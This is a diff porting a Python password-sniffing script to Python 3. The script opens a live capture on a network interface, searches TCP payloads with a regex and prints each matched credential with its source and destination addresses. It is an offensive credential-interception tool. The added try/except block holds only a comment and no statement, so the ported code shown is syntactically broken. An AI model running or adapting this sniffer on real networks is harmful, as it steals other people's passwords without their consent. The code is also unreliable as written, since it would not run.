@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/python3
 
 import sys
 import re
@@ -7,7 +7,7 @@ import pcapy
 from impacket.ImpactDecoder import EthDecoder, IPDecoder, TCPDecoder
 
 # Interface to sniff on
-dev = "eth0"
+dev = "enp3s0f1"
 
 # Pcap filter
 filter = "tcp"
@@ -31,21 +31,26 @@ def handle_packet(hdr, data):
     eth_pkt = eth_dec.decode(data)
     ip_pkt = ip_dec.decode(eth_pkt.get_data_as_string())
     tcp_pkt = tcp_dec.decode(ip_pkt.get_data_as_string())
-    payload = ip_pkt.get_data_as_string()
+    payload = tcp_pkt.get_data_as_string()
+    match = None
+    
+    try:
+        match = re.search(pattern, payload.decode())
+    except (UnicodeError, AttributeError):
+        # We got encrypted or otherwise binary data
 
-    match = re.search(pattern, payload)
     if not tcp_pkt.get_SYN() and not tcp_pkt.get_RST() and \
             not tcp_pkt.get_FIN() and match and \
             match.groupdict()['found'] != None:
-        print "%s:%d -> %s:%d" % (ip_pkt.get_ip_src(),
+        print("%s:%d -> %s:%d" % (ip_pkt.get_ip_src(),
                                   tcp_pkt.get_th_sport(),
                                   ip_pkt.get_ip_dst(),
-                                  tcp_pkt.get_th_dport())
-        print "\t%s\n" % (match.groupdict()['found'])
+                                  tcp_pkt.get_th_dport()))
+        print("\t%s\n" % (match.groupdict()['found']))
 
 
 def usage():
-    print sys.argv[0] + " -i <dev> -f <pcap_filter>"
+    print(sys.argv[0] + " -i <dev> -f <pcap_filter>")
     sys.exit(1)
 
 
@@ -67,5 +72,5 @@ for opt in opts:
 # Start sniffing
 pcap = pcapy.open_live(dev, 1500, 0, 100)
 pcap.setfilter(filter)
-print "Sniffing passwords on " + str(dev)
+print("Sniffing passwords on " + str(dev))
 pcap.loop(0, handle_packet)
